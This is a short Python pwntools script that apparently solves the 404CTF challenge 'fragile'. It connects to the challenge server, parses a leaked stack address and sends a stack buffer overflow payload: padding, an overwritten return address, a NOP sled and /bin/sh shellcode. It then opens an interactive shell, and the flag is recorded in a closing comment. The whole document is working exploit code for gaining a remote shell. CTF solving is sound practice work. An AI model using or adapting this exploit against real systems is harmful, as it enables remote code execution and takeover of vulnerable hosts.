from pwn import *


context.clear(arch="amd64")
#p=process("./fragile")
p=remote("challenge.404ctf.fr", 31720)


padding=b'A'* 72
print(p.recvline())

ret_val = (p.recvline().decode()).split(": ")[1]
ret_adress = p64(int(ret_val,base=16) + 72 + 40 )

nop_sled =asm('nop') *  50
shellcode = asm(shellcraft.sh())


payload = padding + ret_adress + nop_sled + shellcode

p.sendline(payload)


p.interactive()

#404CTF{V0U5_3735_Pr37_P0Ur_14_Pr0CH41N3_M15510N}